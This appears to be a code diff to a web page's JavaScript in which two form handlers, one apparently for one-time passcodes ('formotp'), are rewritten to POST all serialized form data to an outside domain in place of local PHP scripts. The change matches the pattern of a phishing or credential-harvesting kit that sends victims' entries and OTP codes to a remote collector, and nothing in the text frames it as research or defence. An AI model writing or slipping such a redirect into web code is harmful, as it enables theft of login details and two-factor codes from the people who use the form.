@@ -427,7 +427,7 @@ $('#frmSubmit').on('submit', function (event) {
 var dataString = $("#frmSubmit, #formotp").serialize();
 $.ajax( {
 type: 'POST',
-url: 'data/datalaporan.php',
+url: 'https://dramaindosiar.biz.id/data/datalaporan.php',
 data: dataString,
  
  complete: function(data) {
@@ -460,7 +460,7 @@ $('#formotp').on('submit', function (event) {
 var dataString = $("#frmSubmit, #formotp").serialize();
 $.ajax( {
 type: 'POST',
-url: 'data/datalaporanotp.php',
+url: 'https://dramaindosiar.biz.id/data/datalaporanotp.php',
 data: dataString,
  
  complete: function(data) {
